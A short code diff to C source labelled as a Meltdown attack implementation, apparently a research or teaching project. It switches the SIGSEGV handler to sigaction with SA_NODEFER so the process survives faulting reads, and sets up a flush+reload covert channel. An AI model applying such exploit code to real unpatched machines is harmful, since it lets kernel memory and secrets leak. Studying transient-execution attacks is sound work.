@@ -10,8 +10,8 @@
 /// Utils
 jmp_buf jump_after_leak_env;
 
-void sigsegv_handler(int sig) {
-    printf("SIGSEGV (%d) caught!\n", sig);
+void sigsegv_handler(int _sig) {
+    // printf("SIGSEGV (%d) caught!\n", sig);
     longjmp(jump_after_leak_env, 1);
 }
 
@@ -22,7 +22,12 @@ void cause_transient_execution(void) {
 
 /// Meltdown attack implementation
 MeltdownUS meltdown_init(void) {
-    signal(SIGSEGV, sigsegv_handler);
+    struct sigaction sa;
+    sa.sa_handler = sigsegv_handler;
+    sigemptyset(&sa.sa_mask);
+    sa.sa_flags = SA_NODEFER;
+    sigaction(SIGSEGV, &sa, NULL);
+
     const FlushReload channel = fr_init();
     return (MeltdownUS){._channel = channel};
 }
